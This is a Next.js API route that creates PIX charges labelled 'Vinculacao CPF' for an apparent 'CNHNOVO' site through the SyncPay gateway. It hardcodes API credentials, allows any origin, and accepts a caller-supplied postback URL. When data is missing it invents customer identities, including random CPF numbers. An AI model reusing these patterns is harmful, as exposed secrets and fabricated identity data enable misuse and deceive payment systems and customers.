import { NextRequest, NextResponse } from "next/server"
import { getSupabase } from "@/lib/supabase"

const SYNCPAY_BASE_URL = "https://api.syncpayments.com.br"
const SYNCPAY_CLIENT_ID = "192cea75-df6e-46df-8a2d-0f03751ce13c"
const SYNCPAY_CLIENT_SECRET = "6c7f008b-bc68-45b6-b7ed-250f0955ed82"

let cachedToken: string | null = null
let tokenExpiresAt = 0

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
  "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
}

async function getAuthToken() {
  if (cachedToken && Date.now() < tokenExpiresAt - 300000) {
    return cachedToken
  }

  const authResp = await fetch(`${SYNCPAY_BASE_URL}/api/partner/v1/auth-token`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
    },
    body: JSON.stringify({
      client_id: SYNCPAY_CLIENT_ID,
      client_secret: SYNCPAY_CLIENT_SECRET,
    }),
  })

  if (!authResp.ok) {
    const errorText = await authResp.text()
    throw new Error(`Erro ao obter token: ${errorText}`)
  }

  const authData = await authResp.json()
  cachedToken = authData.access_token
  tokenExpiresAt = Date.now() + authData.expires_in * 1000

  return cachedToken
}

function normalizeAmount(rawAmount: unknown) {
  if (rawAmount == null) return { amountCents: 100, amountNum: 1 }
  if (typeof rawAmount === "string") {
    const cleaned = rawAmount.replace(/[^\d,.-]/g, "").replace(",", ".")
    const n = parseFloat(cleaned)
    if (!Number.isFinite(n)) return { amountCents: 100, amountNum: 1 }
    return { amountCents: Math.max(1, Math.round(n * 100)), amountNum: n }
  }
  const n = Number(rawAmount)
  if (!Number.isFinite(n)) return { amountCents: 100, amountNum: 1 }
  if (Number.isInteger(n) && n >= 1000) {
    const num = n / 100
    return { amountCents: Math.max(1, Math.round(num * 100)), amountNum: num }
  }
  return { amountCents: Math.max(1, Math.round(n * 100)), amountNum: n }
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: corsHeaders })
}

export async function POST(request: NextRequest) {
  let body: Record<string, unknown> = {}
  try {
    body = await request.json()
  } catch {
    body = {}
  }

  const randDigits = (len: number) =>
    Array.from({ length: len }, () => Math.floor(Math.random() * 10)).join("")
  const randId = randDigits(6)
  const rawAmount = body.amount ?? body.valor ?? body.total ?? 84.9
  const { amountCents, amountNum } = normalizeAmount(rawAmount)
  const customerName = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString()
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@example.com`).toString()
  const customerPhone = (body.phone || body.customer_phone || `11${randDigits(9)}`)
    .toString()
    .replace(/\D/g, "")
  const cpfRaw = (body.cpf || body.document || body.customer_cpf || randDigits(11))
    .toString()
    .replace(/\D/g, "")
  const customerCpf = cpfRaw.padEnd(11, "0").slice(0, 11)
  const tracking = (body.tracking || body.rastreio || body.codigo || `pedido-${randId}`).toString()

  let token
  try {
    token = await getAuthToken()
  } catch (err) {
    return NextResponse.json(
      { success: false, error: (err as Error).message },
      { status: 500, headers: corsHeaders }
    )
  }

  const expiresDate = new Date()
  expiresDate.setDate(expiresDate.getDate() + 2)
  const expiresInDays = expiresDate.toISOString().split("T")[0]

  const payload = {
    ip: "127.0.0.1",
    pix: { expiresInDays },
    items: [{ title: "Vinculacao CPF", quantity: 1, tangible: false, unitPrice: amountCents }],
    amount: amountCents,
    customer: {
      cpf: customerCpf,
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      externaRef: tracking,
      address: {
        city: "Sao Paulo",
        state: "SP",
        street: "Rua Exemplo",
        country: "BR",
        zipCode: "01000-000",
        complement: "",
        neighborhood: "Centro",
        streetNumber: "123",
      },
    },
    metadata: {
      provider: "CNHNOVO",
      sell_url: "https://cnhnovo.com",
      order_url: "https://cnhnovo.com/pedido",
      user_email: customerEmail,
      user_identitication_number: customerCpf,
    },
    traceable: true,
    postbackUrl: process.env.POSTBACK_URL || (body.postback as string) || "https://cnhnovo.com/api/webhook",
  }

  const syncResp = await fetch(`${SYNCPAY_BASE_URL}/v1/gateway/api`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify(payload),
  })

  const text = await syncResp.text()
  if (!syncResp.ok) {
    return NextResponse.json(
      { success: false, error: text || "Erro ao criar PIX" },
      { status: syncResp.status, headers: corsHeaders }
    )
  }

  let data: Record<string, unknown> = {}
  try {
    data = JSON.parse(text)
  } catch {
    data = {}
  }

  const brcode = (data?.paymentCode as string) || null
  const qrcodeFinal = data?.paymentCodeBase64
    ? `data:image/png;base64,${data.paymentCodeBase64}`
    : null
  const paymentId = (data?.idTransaction as string) || null

  try {
    const supabase = getSupabase()
    await supabase.from("transactions").insert({
      transaction_id: paymentId,
      amount: amountNum,
      customer_name: customerName,
      customer_email: customerEmail,
      customer_cpf: customerCpf,
      customer_phone: customerPhone,
      tracking: tracking,
      status: "PENDING",
      brcode,
      qrcode: qrcodeFinal,
    })
  } catch {
    // Silently fail
  }

  return NextResponse.json(
    {
      success: true,
      pix_code: brcode,
      transaction_id: paymentId,
      deposit_id: paymentId,
      qrcode: qrcodeFinal,
      amount: amountNum,
      key: null,
      brcode,
      payload: brcode,
      pixCode: brcode,
      pix: { key: null, brcode, qrcode: qrcodeFinal, payload: brcode },
      raw: data,
    },
    { headers: corsHeaders }
  )
}
